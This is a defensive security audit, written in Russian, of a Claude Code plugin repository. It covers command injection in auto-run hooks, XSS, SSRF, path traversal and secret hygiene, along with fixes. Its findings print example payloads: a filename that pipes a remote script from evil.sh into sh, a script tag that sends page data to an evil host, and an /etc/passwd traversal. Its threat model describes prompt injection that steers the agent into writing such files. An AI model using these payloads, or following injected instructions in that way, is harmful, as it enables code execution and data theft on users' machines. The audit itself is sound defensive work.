# Security Review — Ecosystem 3.0 repository (2026-07-11)

> **Назначение:** систематический защитный security-проход по репозиторию — 4-й
> (жёлтый) компонент [`SUBSTRATE_GRADUATION_GATE.md`](SUBSTRATE_GRADUATION_GATE.md)
> «Security review». Закрывает критерий «ручной проход по OWASP-классам (injection,
> secret-leak, authz-обход, path-traversal) и находки закрыты/приняты явно».
>
> **DEC:** DEC-DEV-0189 · **Дата:** 2026-07-11 · **Ветка:** `docs/security-review-graduation`
> **Проходил:** защитный аудит собственного кода (не пентест внешней цели).

---

## Threat model

Экосистема при `/ecosystem:bootstrap` копирует `hooks/`, `commands/`, `skills/`,
`agents/`, `adapters/` в `.claude/` пользовательского проекта. **Хуки исполняются
автоматически** на файловых/сессионных событиях (PostToolUse / PreToolUse /
SessionStart / SubagentStop) — без явного подтверждения пользователем на каждый
запуск. Основной реалистичный вектор атаки: **prompt-injection** — враждебный
контент в файле/спеке/репозитории, который пользователь просит Claude обработать,
наводит агента (a) написать файл с крафт-**именем** или крафт-**контентом**, либо
(b) выполнить действие, — после чего авто-хук превращает это в исполнение на машине
пользователя. Вторичный вектор: враждебный ввод в dev-tooling самой экосистемы
(git-refs, commit-messages) на машине мейнтейнера.

## Что сканировалось и какими осями

| Зона | Файлы | Оси |
|---|---|---|
| **hooks/** (авто-исполняемые) | `product/*` (14), `design/*` (7), `integrator/*` (4), `orchestrator/*` (1) | command-injection, path-traversal, unsafe-require/eval, запись вне зон, fail-open↔fail-closed, XSS в генерируемом HTML |
| **dev/meta-improvement/scripts/ + hooks/** | ~21 script + 6 dev-hooks; git-хуки (`process-gate.js`, `install-git-hooks.cjs`) | то же + что интерполируется в shell на машине мейнтейнера |
| **package.json scripts** | вся `verify`-цепь | что инжектится в shell |
| **Supply chain** | `install.sh`, `install.ps1`, `commands/ecosystem/bootstrap.md`, `update.md` | откуда качается/копируется, перезапись пользовательских файлов, `rm -rf`/`Remove-Item` таргеты, права, `--dangerously-skip-permissions` |
| **adapters/** | `handoff-to-ccsdd.js`, `od-*`, `mk-to-stitch.js`, `stitch-to-opendesign.js` | обработка внешнего контента, exec, сеть, секреты |
| **Секреты** | grep по репо (ключи/токены/PEM) + `.env.template` | committed secrets, гигиена |
| **Шаблоны** | `settings.json.template`, `gitignore.template`, `.env.template` | дефолтные permissions/hooks, ignored-зоны |

**Инструментарий:** ripgrep-паттерны по `exec*/spawn*/child_process/eval/new Function/
require(var)/fs.write*/rm*`, паттерны секретов (`sk-…`, `ghp_…`, `AKIA…`, PEM,
`key/token/secret = "…"`), ручное чтение всех авто-исполняемых хуков + supply-chain
доков + adapters. Часть fan-out делегирована параллельному opus-ревьюеру (design/
orchestrator/misc хуки + adapters), результат сверен вручную по осям.

---

## Findings

Severity: **critical** (RCE/leak без спец-условий) · **high** (RCE/leak под достижимым
вектором) · **medium** (ограниченный impact или узкий вектор) · **low** (info-disclosure/
defense-in-depth) · **info** (постура/наблюдение).

### H-1 — Command injection в 3 PostToolUse change-trigger хуках · **HIGH** · ПОЧИНЕНО

- **Где:** `hooks/product/br-change-trigger.js:82`, `hooks/product/ic-change-trigger.js:82`,
  `hooks/product/zone-change-trigger.js:96` (до фикса).
- **Код (до):** `execSync(\`git -C "${projectRoot}" diff HEAD -- "${relPath}"\`, {…})`,
  где `relPath = path.relative(projectRoot, filePath)` а `filePath = hookInput.tool_input.file_path`.
- **Сценарий эксплуатации:** хуки регистрируются как PostToolUse Write/Edit и авто-исполняются
  в проекте пользователя. Фильтр имени артефакта (`\.product/(business-rules|invariants)/[^/]+\.md$`
  / `\.product/.+\.md$`) допускает в сегменте имени любой не-`/` символ, включая `$()`, backtick,
  `;`. На POSIX (`/bin/sh` под `execSync`) command-substitution **внутри двойных кавычек
  вычисляется**. Prompt-injection наводит агента создать `.product/business-rules/x$(curl -s evil.sh|sh).md`
  → файл проходит фильтр, читается хуком (значит существует на диске), путь интерполируется в
  шелл-команду → **произвольное исполнение на машине пользователя без подтверждения**.
  (На Windows `cmd.exe` не делает `$()`/backtick substitution, а `"`/`<`/`>`/`|` запрещены в
  именах файлов NTFS — Windows-эксплуатация труднее; POSIX-платформы Claude Code уязвимы.)
- **Фикс:** `execFileSync('git', ['-C', projectRoot, 'diff', 'HEAD', '--', relPath], {…})` —
  без шелла, аргументы дискретны, метасимволы не интерпретируются. Поведение диффа 1:1.
- **Верификация:** hook-smoke 43/43; функциональный тест (diff `CHANGED` захвачен в
  `da-pending.yaml`); injection-PoC → `SAFE` (команда из имени файла не исполнена).

### M-1 — Stored XSS в генерируемом `app-map.html` · **MEDIUM** · report-only

- **Где:** `hooks/design/app-map-html.js:122` — `'<script>const DATA=' + JSON.stringify(DATA) + ';</script>'`.
- **Сценарий:** `JSON.stringify` не экранирует `<` / `</script>`. Каждое строковое поле `DATA`
  (заголовки FM/NM/CJM-таблицы, парсенные из `.product/`-артефактов) — prompt-injection-влияемо.
  Значение `title: "x</script><script>fetch('//evil/?d='+document.body.innerHTML)</script>"` вырывается
  из инлайн-скрипта; при открытии сгенерированного `app-map.html` в браузере (`file://`-origin) скрипт
  исполняется и эксфильтрует встроенные данные мокапа. Runtime-`esc()` во вьюере НЕ защищает — прорыв
  на этапе сырого `const DATA=` до `esc()`. (NB: соседний `<title>` на строке 110 экранирован `.replace(/</g,'&lt;')` — уязвим только инлайн-DATA.)
- **Impact-граница:** локальный файл, свой контент, `file://`-origin, нет cross-user/сессии/auth
  → MEDIUM, не high.
- **Рекомендация:** эскейпить перед встраиванием — `JSON.stringify(DATA).replace(/</g,'\\u003c').replace(/ /g,'\\u2028').replace(/ /g,'\\u2029')`.

### M-2 — Command injection в dev-инструменте `next-dec-dev.js` · **MEDIUM** · report-only

- **Где:** `dev/meta-improvement/scripts/next-dec-dev.js:181` — `execSync(\`git show ${ref}:${JOURNAL_REL}\`, {…})`.
- **Сценарий:** `ref` — имя ветки из `listRemoteBranches()`/`listLocalBranches()` (`git branch -r/--format`).
  `git check-ref-format` **не** запрещает backtick / `$()` / `;` / `|` в имени ссылки. Враждебная
  remote-ветка (напр. в PR/форке) + `git fetch origin` (который этот скрипт делает) + запуск
  `npm run next-dec-dev` = инъекция на машине мейнтейнера.
- **Impact-граница:** dev-only (в пилот не шипится), требует враждебной remote-ветки достигшей
  локальных refs + запуска инструмента → MEDIUM.
- **Рекомендация:** `execFileSync('git', ['show', \`${ref}:${JOURNAL_REL}\`], {…})`.

### L-1 — Bearer-токен на caller-контролируемый `--daemon-url` · **LOW** · report-only

- **Где:** `adapters/stitch-to-opendesign.js` (`resolveToken()` + `postToOpenDesign()`, ~324-355).
- **Сценарий:** возможно машинно-глобальный токен (`~/.claude/integrator/secrets/open-design.token`)
  отправляется как `Authorization: Bearer` на полностью caller-контролируемый `--daemon-url`. Prompt-injection
  `--daemon-url http://evil.tld` → SSRF-с-кредами, утечка токена на чужой хост.
- **Рекомендация:** при наличии резолвнутого токена ограничить `--daemon-url` loopback (127.0.0.1/localhost),
  либо требовать явный opt-in-флаг для non-loopback.

### L-2 — Arbitrary-file read (12 байт) через крафт `.git/HEAD` · **LOW** · report-only

- **Где:** `hooks/product/session-state.js:135-151` — `path.join(projectRoot, '.git', refMatch[1])`.
- **Сценарий:** `refMatch[1]` берётся из содержимого `.git/HEAD`; `ref: ../../../../etc/passwd` выводит
  за пределы и утекает первые 12 символов произвольного файла в `git_head_sha` локального `current.yaml`.
- **Рекомендация:** валидировать `^refs/[\w./-]+$`, отклонять `..`.

### L-3 — Секрет как argv `docker -e OD_API_TOKEN=…` · **LOW** · report-only

- **Где:** `adapters/od-mcp-call.cjs:83-88`, `adapters/od-consolidate.cjs:33-35`.
- **Сценарий:** токен — argv-элемент spawn'а (не shell-инъекция: массив-args, безопасно на этой оси),
  но виден в таблице процессов (`ps`) другим локальным пользователям на шаренном хосте.
- **Рекомендация:** передавать токен через унаследованное окружение/stdin, не argv.

### L-4 — Unsandboxed exec проектно-локального кода на SessionStart · **LOW / by-design** · report-only

- **Где:** `hooks/orchestrator/session-fabric-status.js:54-67` — `execFileSync(process.execPath, [enginePath, …])`,
  где `enginePath` = `.claude/orchestrator/lib/fabric-engine.cjs`.
- **Сценарий:** `execFileSync` без шелла безопасен против инъекции, но это исполнение проектно-локального
  JS на старте сессии. Если агента навели записать троянский `fabric-engine.cjs` + каталог `fabric/`, он
  выполнится на следующем SessionStart (persistence-вектор). Присуще дизайну хука. (Родственно: `inst.subject`
  из fabric-state и CNT-derived `detail` в `drift-check.js` инжектятся в LLM как `additionalContext` — prompt-injection
  поверхность, если fabric-state враждебен.)
- **Рекомендация:** опционально — integrity-check движка; как минимум зафиксировать trust-boundary.

### L-5 — dev-only интерполяция в `git check-ignore` · **LOW** · report-only

- **Где:** `dev/meta-improvement/scripts/check-information-map.js:113` — `execSync(\`git check-ignore -q "${rel}"\`)`.
- **Сценарий:** `rel` — путь, извлечённый из `INFORMATION-MAP.yaml`. Dev-only, `rel` фактически из
  контролируемого репо-файла; вектор узкий. Рекомендация: `execFileSync('git', ['check-ignore','-q',rel])`.

### INFO — постура и наблюдения

- **`settings.json.template` дефолт-allowlist** пре-одобряет `Bash(npx:*)`, `Bash(npm install:*)`,
  `Bash(git push:*)` и безусловные `Write`/`Edit`/`Read`/`Glob`/`Grep`. `npx:*` = скачивание+исполнение
  произвольного пакета **без промпта**; `npm install:*` = произвольные lifecycle-скрипты. В связке с
  prompt-injection это авто-одобренная поверхность исполнения кода. Смена дефолт-постуры — решение
  владельца (может сломать легитимные потоки), не «тривиальный безопасный фикс» → не менялось.
- **Install-скрипты** (`install.sh`/`install.ps1`): `curl … | bash` / `iwr … | iex` — стандартный
  (документированный) паттерн; клон по HTTPS из пиннутого GitHub-репо; переменные корректно закавычены
  (инъекции нет); `git reset --hard "origin/$BRANCH"` затирает локальные правки **глобального кэша**
  `~/.claude/ecosystem` (не проекта пользователя). `ECOSYSTEM_REPO_URL`/`ECOSYSTEM_BRANCH` env-override —
  требует уже-контроля окружения. Приемлемо.
- **Bootstrap/update supply-chain:** все `rm -rf` scoped к `.claude-ecosystem-tmp*` (temp) или известным
  подкаталогам; namespace-preserve и level-1/level-2 wipe-protection задокументированы (`update.md`); `curl`
  в `commands/**` — read-only health-пробы к loopback `127.0.0.1:7456`. `bootstrap.md` рекомендует
  `--dangerously-skip-permissions` — задокументированный UX-tradeoff с явными предупреждениями. Новой
  high-находки нет.
- **Секреты:** grep по репо (ключи/токены/PEM/`ghp_`/`sk-`/`AKIA`) **чист** — единственный хит —
  фейковое имя env-var `STRIPE_SECRET_KEY_P7SEAM_777` в тест-фикстуре (намеренно absent). `.env.template`
  гигиеничен: все ключи пусты + нота «`.env` gitignored, never commit». `gitignore.template` корректно
  игнорирует `.env*` и `.claude/integrator/secrets/`.
- **Command injection в остальных dev-скриптах:** проверены все `exec*/spawn*` call-sites. Прочие
  (`process-gate.js`, `check-counts.js`, `next-dec-dev.js` кроме :181, `rails-build.js`, `gen-*.cjs`,
  `install-git-hooks.cjs`, `effect-probe.js`) используют **статические** command-строки или `execFileSync`/
  `spawnSync` с массивом — инъекции нет. `process-gate.js` (commit-msg git-хук) читает commit-message
  **только regex-тестом**, в шелл его не передаёт — безопасен.
- **Fail-open — повсеместно и намеренно** для detect-only/advisory хуков (exit 0 при ошибке). Для warn-only
  слушателей это корректный выбор доступности, но означает, что product/design-валидаторы не дают security-
  **enforcement** — крафт/невалидный артефакт ставится в очередь/ворнится, но не блокируется. Это by-design
  (hard-block отложен), не дефект.
- **`adapters/handoff-to-ccsdd.js`** — чистый stdlib string-processing, без exec/сети; `--output` пишет по
  argv-пути (выбор оператора, не авто-хук). Чист.

---

## Итог по severity

| Severity | Кол-во | Статус |
|---|---|---|
| critical | 0 | — |
| high | 1 (H-1) | **починен** |
| medium | 2 (M-1 XSS, M-2 dev-injection) | приняты (владельцу) |
| low | 5 (L-1..L-5) | приняты (владельцу) |
| info | — | наблюдения |

**Нефикшенных critical/high нет.**

---

## Что НЕ покрыто (честная граница)

- **Runtime-фаззинг / DAST:** проход — статический read + точечные PoC, не автоматизированный фаззер
  входов хуков. `execFileSync`-фикс верифицирован функционально + PoC на Windows-хосте; POSIX-эксплойт
  H-1 обоснован анализом shell-семантики, не прогнан на живом Linux (Windows-хост ревью).
- **Транзитивные npm-зависимости:** `npm audit` = 0 vulnerabilities на момент прохода, но supply-chain
  самих `eslint`/`puppeteer-core` (и их деревьев) не аудирован построчно.
- **`commands/`/`skills/`/`agents/` как prompt-surface:** markdown-инструкции для LLM (prompt-injection
  внутри самих команд, эскалация инструкций) — отдельный класс, здесь не разбирался системно (кроме отметки
  `additionalContext`-инъекции в L-4).
- **MCP-серверы** (Brave/Firecrawl/Exa/GitHub/open-design daemon) как доверенные внешние стороны — их
  собственная безопасность и TLS-верификация вне охвата.
- **Claude Code harness сам по себе** (обработка hook-stdout, `permissionDecision`, лимиты
  `additionalContext`) — принят как доверенная платформа.
- **Design/orchestrator хуки глубоко:** часть fan-out прошла через параллельного ревьюера + ручную сверку
  по осям, но не построчный аудит каждой строки всех ~26 хуков — приоритет отдан авто-исполняемому
  consumer-периметру.
- **Полноценный CI-security-gate** (SAST в pipeline) — этот проход = осознанный solo-субститут, не
  автоматизированный непрерывный gate (расширение потолка — отдельный трек вне floor-порога).

---

## Cross-references

- [`SUBSTRATE_GRADUATION_GATE.md`](SUBSTRATE_GRADUATION_GATE.md) — компонент 4 (закрывается этим отчётом).
- [`DEV_JOURNAL.md` → DEC-DEV-0189](../../DEV_JOURNAL.md) — решение + lessons + принятый остаточный долг.
- `CHANGELOG.md` `[Unreleased] ### Fixed` — H-1 (consumer-zone фикс).
